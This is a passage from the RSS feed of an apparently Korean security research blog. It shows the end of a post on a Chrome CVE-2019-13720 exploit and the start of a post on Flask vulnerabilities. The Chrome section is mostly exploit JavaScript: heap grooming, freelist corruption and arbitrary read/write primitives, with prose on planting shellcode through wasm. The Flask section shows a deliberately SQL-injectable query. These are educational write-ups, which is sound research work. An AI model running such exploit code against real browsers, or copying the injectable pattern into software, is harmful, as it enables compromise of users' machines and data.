    		&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
         	&lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getFrequencyResponse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;floatArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.1415927410125732&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectGargabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
        		&lt;span class=&quot;nx&quot;&gt;audioBufferArray2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                 		&lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sharedAudioCtx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
 
        		&lt;span class=&quot;nx&quot;&gt;iirFilters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    	     		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectGargabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;336&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            			&lt;span class=&quot;nx&quot;&gt;imageDataArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ImageData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        		&lt;span class=&quot;nx&quot;&gt;imageDataArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;collectGargabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            			&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;audioBufferArray1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getChannelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                			&lt;span class=&quot;nx&quot;&gt;kickPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
             		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
        		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;heap defragmentationì€ GCë¥¼ ê°•ì œë¡œ í˜¸ì¶œí•´ì„œ ë°œìƒì‹œí‚µë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;kickPayload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;audioCtx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;OfflineAudioContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;partitionPagePtr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;getPartitionPageMetadataArea&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;byteSwapBigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]));&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;byteSwapBigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;partitionPagePtr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    		&lt;span class=&quot;nx&quot;&gt;gcPreventer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x100000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;auxArray&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;freelist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ArrayBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;gcPreventer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;freelist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ê·¸ë¦¬ê³  ì´ì „ì— freeëœ AudioArray ë°ì´í„°ì˜ raw pointer ì£¼ì†Œë¥¼ í¬í•¨í•˜ëŠ” ì´ì „ì— ìƒì„±ëœ BigUint64Arrayë¥¼ ì „ë‹¬í•˜ëŠ” kickPayload í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-jsx highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rwHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;rwHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;gcPreventer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;byteSwapBigInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rwHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;write64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rwHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;rwHelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BigUint64Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;gcPreventer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì´í›„ freeëœ ê°ì²´ì˜ PartitionPage ë©”íƒ€ ë°ì´í„°ë¥¼ ì¡°ì‘í•˜ì—¬ exploitì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ë‹¤ë¥¸ ì˜¤ë¸Œì íŠ¸ì˜ ì£¼ì†Œë¥¼  BigUint64Arrayì— ê¸°ë¡í•˜ê³  ìƒˆ 8 ë°”ì´íŠ¸ ê°ì²´ë¥¼ ë§Œë“  ë’¤ ì¸ë±ìŠ¤ 0ì—ìˆëŠ” ê°’ì„ ë‹¤ì‹œ ì½ìœ¼ë©´ ì´ì „ì— ì„¤ì •ëœ ì£¼ì†Œì—ì„œ ê°’ì„ ì½ìŠµë‹ˆë‹¤. ì´ ë‹¨ê³„ì—ì„œ ì¸ë±ìŠ¤ 0ì— ë¬´ì–¸ê°€ê°€ ê¸°ë¡ë˜ë©´ì´ ê°’ì€ ì´ì „ì— ì„¤ì •ëœ ì£¼ì†Œì— ëŒ€ì‹  ê¸°ë¡ë©ë‹ˆë‹¤. ê·¸ë ‡ê²Œ í•´ì„œ arbitrary read/writeë¥¼ ë§Œë“¤ê³  wasm ì½”ë“œë¥¼ ì´ìš©í•´ rwx ì˜ì—­ì— ì›í•˜ëŠ” ì‰˜ì½”ë“œë¥¼ ì ê³  exploití•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/chrome-CVE-2019-13720-exploit</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/chrome-CVE-2019-13720-exploit</guid>
        
        <category>cve</category>
        
        <category>pwn</category>
        
        
      </item>
    
      <item>
        <title>Vulnerabilities of Flask</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ í™©ì •ì‹&lt;/p&gt;

&lt;p&gt;Flaskì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì€ í¬ê²Œ ì°¸ì¡°í•œ ëª¨ë“ˆ(Module), ë Œë”ë§ ë°©ë²•, ìš´ìš© ë°©ë²• ë“±ì—ì„œ ì¼ì–´ë‚  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¨, &lt;strong&gt;ìš´ìš© ë°©ë²•&lt;/strong&gt;ì˜ ê²½ìš° Debug=True ì˜µì…˜, Thread ë° Process ê´€ë¦¬ ë“±, &lt;strong&gt;ì·¨ì•½ì ì´ ì¼ì–´ë‚˜ê¸° ìœ„í•œ ì „ì œ ì¡°ê±´ì´ ë§¤ìš° ê¹Œë‹¤ë¡­ê¸° ë•Œë¬¸&lt;/strong&gt;ì— &lt;strong&gt;ì´ì— ëŒ€í•œ ë°©ë²•ì€ ìƒëµ&lt;/strong&gt;í•˜ê² ìŠµë‹ˆë‹¤. ì´ë²ˆ ë³´ê³ ì„œì—ì„œëŠ” ëª¨ë“ˆ ì´ìš©, ë Œë”ë§ ë°©ë²•ì— ëŒ€í•œ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì›ì¸ê³¼ ì´ì— ëŒ€í•œ ëŒ€ì‘ ë°©ë²•ì„ ì •ë¦¬í•´ë³´ì•˜ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;1-vulnerabilities-of-modules&quot;&gt;1. Vulnerabilities of Modules&lt;/h1&gt;

&lt;p&gt;Flaskì—ì„œ ì´ìš©í•˜ëŠ” ëª¨ë“ˆì€ Flask ìì²´ì ì¸ ëª¨ë“ˆ ë¿ë§Œì´ ì•„ë‹ˆë¼ ì„œë¹„ìŠ¤ë¥¼ ê°œë°œí•˜ê¸° ìœ„í•´ ì‚¬ìš©ëœ ëª¨ë“ˆì´ ìˆìŠµë‹ˆë‹¤.  ëŒ€í‘œì ìœ¼ë¡œ SQLê³¼ í†µì‹ í•˜ê¸° ìœ„í•´ ì‚¬ìš©ëœ sqlite, pymysql, sqlalchemy ë“±ì´ ìˆìŠµë‹ˆë‹¤. ì´ì™€ ê°™ì€ ëª¨ë“ˆì„ ì´ìš©í•˜ëŠ” ë°©ë²•ì— ë”°ë¼ ì·¨ì•½ì ì´ ë°œìƒí•  ìˆ˜ ìˆëŠ”ë°, ë¨¼ì € SQL Injection ë°œìƒì´ ê°€ëŠ¥í•œ ì½”ë“œë¥¼ ì‚´í´ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;11-sql-connection-module&quot;&gt;1.1. SQL Connection Module&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;PyMySQL(or SQLite), ì˜ëª»ëœ ì¸ìê°’ ì „ë‹¬ ë°©ë²•&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;app.models&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;#...
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;query&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM user WHERE uid='%s' AND pw='%s'&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pw&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
